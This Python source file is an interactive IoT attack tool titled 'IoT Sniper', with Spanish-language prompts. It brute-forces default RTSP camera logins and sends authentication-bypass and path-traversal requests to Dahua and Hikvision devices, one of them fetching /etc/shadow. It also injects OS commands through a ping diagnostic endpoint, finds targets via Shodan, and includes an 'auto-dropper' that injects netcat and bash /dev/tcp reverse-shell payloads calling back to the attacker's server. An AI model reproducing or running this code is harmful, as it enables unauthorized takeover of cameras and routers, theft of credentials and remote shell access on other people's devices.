import os
import sys
import time
import socket
import urllib.request
import urllib.error
import urllib.parse
from threading import Thread

# Dependencias opcionales
try:
    import builtins
except ImportError:
    pass

try:
    import colorama
    from colorama import Fore, Style
    colorama.init()
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
except ImportError:
    RED = GREEN = YELLOW = CYAN = RESET = ""

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False


def print_banner():
    banner = f"""{RED}
    ========================================================
       ___  ___ _____   ___       _                  
      |_ _|/ _ \_   _| / __|_ _  (_)___  ___ _ _     
       | || (_) || |   \__ \ ' \ | | _ \/ -_) '_|    
      |___|\___/ |_|   |___/_||_|//| .__/\___|_|     
                                   |_|               
    ========================================================
    [ IoT Edge Exploitation Toolkit - C2 Arsenal ]
    {RESET}"""
    # Usando ascii_errors replace para garantizar que no crashea en terminales Windows genéricas
    print(banner.encode('ascii', errors='replace').decode('ascii'))


def check_rtsp_auth(ip, username, password):
    url = f"rtsp://{username}:{password}@{ip}:554/cam/realmonitor?channel=1&subtype=0"
    try:
        # Check RTSP opening purely via raw TCP socket string to avoid heavy cv2 imports in standalone
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip, 554))
        request = f"DESCRIBE {url} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        s.send(request.encode())
        response = s.recv(1024).decode()
        s.close()
        
        if "401 Unauthorized" in response:
            return False
        elif "200 OK" in response or "RTSP/1.0 200" in response:
            return True
        return False
    except Exception:
        return False

def do_rtsp_brute():
    print(f"\n{CYAN}--- [ RTSP Brute-Forcer ] ---{RESET}")
    target = input(f"{YELLOW}[?] IP Objetivo: {RESET}").strip()
    
    passwords = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("root", "root"),
        ("admin", "123456"),
        ("admin", "password")
    ]
    
    print(f"[*] Escaneando puerto RTSP en {target}...")
    for user, pwd in passwords:
        print(f"    -> Probando {user}:{pwd} ...", end="", flush=True)
        if check_rtsp_auth(target, user, pwd):
            print(f" {GREEN}[ EXITO ]{RESET}")
            print(f"\n{GREEN}[+] Cámara VULNERABLE!{RESET}")
            print(f"[+] Cadena de streaming: rtsp://{user}:{pwd}@{target}:554/")
            return
        else:
            print(f" {RED}[ FAIL ]{RESET}")
            time.sleep(0.5)
            
    print(f"\n{RED}[-] Diccionario agotado. Cámara segura frente a default creds.{RESET}")


def do_web_bypass():
    print(f"\n{CYAN}--- [ Web Auth Bypass & File Grabber ] ---{RESET}")
    target = input(f"{YELLOW}[?] URL o IP Objetivo (Ej: http://192.168.1.50): {RESET}").strip()
    if not target.startswith("http"): target = "http://" + target
    
    # Common bypass routes for IoT
    payloads = [
        "/system.ini?loginuse&loginpas",        # Dahua Bypass
        "/System/configurationFile?custom=1",   # Hikvision Auth Bypass
        "/config/System.xml",
        "//..//..//etc/shadow"                  # Generic Path Traversal
    ]
    
    print(f"[*] Testeando rutas conocidas de evasión de autenticación en {target}...")
    for route in payloads:
        url = target + route
        print(f"[*] Petición GET: {route}")
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=3) as resp:
                content = resp.read()
                if resp.status == 200 and len(content) > 50:
                    print(f"    {GREEN}[!] VULNERABLE: Servidor devolvió HTTP 200 y descargas{RESET}")
                    print(f"    {GREEN}[!] Los primeros 100 bytes del archivo extraído son:{RESET}")
                    print(f"    {content[:100]}...\n")
                    break
        except urllib.error.HTTPError as e:
            print(f"    {RED}[-] Bloqueado (HTTP {e.code}){RESET}")
        except Exception:
            print(f"    {RED}[-] Error de conexión{RESET}")


def do_shodan_search():
    print(f"\n{CYAN}--- [ Búsqueda Global de Objetivos (Shodan) ] ---{RESET}")
    if not SHODAN_AVAILABLE:
        print(f"{RED}[!] Error: La librería shodan no está instalada. (pip install shodan){RESET}")
        return
        
    api_key = input(f"{YELLOW}[?] Ingresa tu Shodan API Key (o deja vacío si no tienes): {RESET}").strip()
    if not api_key:
        print("[-] Operación cancelada sin API KEY.")
        return
        
    query = input(f"{YELLOW}[?] Término de búsqueda (Ej: 'Hikvision', 'port:554'): {RESET}").strip()
    try:
        api = shodan.Shodan(api_key)
        print(f"[*] Buscando '{query}' en Shodan globalmente...")
        results = api.search(query)
        print(f"{GREEN}[+] Total encontrados: {results['total']}{RESET}\n")
        
        limit = min(10, len(results['matches']))
        print(f"Mostrando los 10 principales:")
        for result in results['matches'][:limit]:
            ip = result['ip_str']
            port = result['port']
            org = result.get('org', 'Unknown')
            print(f" -> IP: {ip:<16} Puerto: {port:<6} Entidad: {org}")
            
    except shodan.APIError as e:
        print(f"{RED}[-] Error de Shodan: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error inesperado: {e}{RESET}")


def do_command_injection():
    print(f"\n{CYAN}--- [ OS Command Injection (Test) ] ---{RESET}")
    target = input(f"{YELLOW}[?] URL Objetivo (Ej: http://192.168.1.50): {RESET}").strip()
    if not target.startswith("http"): target = "http://" + target
    
    cmd = input(f"{YELLOW}[?] Comando Linux a inyectar (Ej: id): {RESET}").strip()
    print(f"[*] Testeando inyección en panel de ping/diagnóstico...")
    
    # Payload explotando un ping diagnostico vulnerable
    payload_url = f"{target}/cgi-bin/network_test?host=127.0.0.1;{urllib.parse.quote(cmd)}"
    
    try:
        req = urllib.request.Request(payload_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = resp.read().decode('utf-8', errors='ignore')
            if 'uid=' in data or 'root' in data or len(data)>0:
                 print(f"{GREEN}[+] Inyección Exitosa. Salida del servidor:{RESET}")
                 print(data[:500])
                 return
    except urllib.error.HTTPError as e:
        print(f"{RED}[-] Inyección rebotada (HTTP {e.code}){RESET}")
    except Exception:
         print(f"{RED}[-] Host inalcanzable u otro fallo de conexión.{RESET}")


def do_auto_dropper():
    print(f"\n{CYAN}--- [ Auto-Dropper: C2 Infection via RCE ] ---{RESET}")
    target = input(f"{YELLOW}[?] URL Objetivo Vulnerable (Ej: http://192.168.1.50): {RESET}").strip()
    if not target.startswith("http"): target = "http://" + target
    
    attacker_ip = input(f"{YELLOW}[?] Tu IP (o IP de tu C2 Server): {RESET}").strip()
    attacker_port = input(f"{YELLOW}[?] Puerto de escucha local (Ej: 4444): {RESET}").strip()
    
    print(f"\n{CYAN}[*] Selecciona el tipo de Payload a inyectar:{RESET}")
    print("    1) Netcat inverso clásico (nc -e /bin/sh)")
    print("    2) Bash TCP One-Liner (/dev/tcp)")
    payload_choice = input(f"{YELLOW}[?] Opción (1/2): {RESET}").strip()
    
    payload = ""
    if payload_choice == '1':
        payload = f"nc {attacker_ip} {attacker_port} -e /bin/sh"
    elif payload_choice == '2':
        payload = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
    else:
        print(f"{RED}[-] Opción inválida.{RESET}")
        return
        
    print(f"[*] Payload generado: {payload}")
    print(f"[*] Inyectando Dropper mediante CVE genérico OS Command Injection...")
    
    # Explotación usando la vulnerabilidad de network_test para colar el payload inverso
    payload_url = f"{target}/cgi-bin/network_test?host=127.0.0.1;{urllib.parse.quote(payload)}"
    
    try:
        req = urllib.request.Request(payload_url, headers={'User-Agent': 'Mozilla/5.0'})
        print(f"{GREEN}[+] Dropper enviado al destino. Verifica tu puerto {attacker_port}.{RESET}")
        # Al ser una reverse shell (proceso ininterrumpido), la peticion se quedará colgada si tiene éxito
        urllib.request.urlopen(req, timeout=3)
    except urllib.error.URLError:
        print(f"{GREEN}[+] ¡Timeout interceptado! (Esto indica que la Reverse Shell está corriendo).{RESET}")
    except Exception as e:
         print(f"{RED}[-] No hubo respuesta o fallo de red: {e}{RESET}")


def interactive_menu():
    while True:
        print_banner()
        print(" Opciones de Ataque:")
        print(f"   {CYAN}1){RESET} RTSP Brute-Forcer Automático (Streaming)")
        print(f"   {CYAN}2){RESET} Web Authentication Bypass (Saqueador de NVRs/Cámaras)")
        print(f"   {CYAN}3){RESET} Test de Inyección de Comandos (OS Command Injection)")
        print(f"   {CYAN}4){RESET} Reconocimiento Perimetral mediante Shodan API")
        print(f"   {CYAN}5){RESET} Auto-Dropper (Infectar Host con Módulo C2)")
        print(f"   {CYAN}0){RESET} Salir del Arsenal")
        
        opt = input(f"\n{YELLOW}Sniper > {RESET}").strip()
        
        if opt == '1':
            do_rtsp_brute()
        elif opt == '2':
            do_web_bypass()
        elif opt == '3':
            do_command_injection()
        elif opt == '4':
            do_shodan_search()
        elif opt == '5':
            do_auto_dropper()
        elif opt == '0':
            print("Cerrando Arsenal IoT Sniper...")
            sys.exit(0)
        else:
            print(f"{RED}Opcion invalida{RESET}")
        
        input(f"\nPulsa [ENTER] para volver al menú principal...")
        os.system('cls' if os.name == 'nt' else 'clear')


if __name__ == '__main__':
    # Validacion: si pasan flags -t, usar en modo cli no-interactivo
    if len(sys.argv) > 1:
        print(f"{RED}[!] Modo GUI Interactivo forzado. Ignorando argumentos shell.{RESET}")
    try:
        interactive_menu()
    except KeyboardInterrupt:
        print("\nCerrando Arsenal IoT Sniper...")
        sys.exit(0)
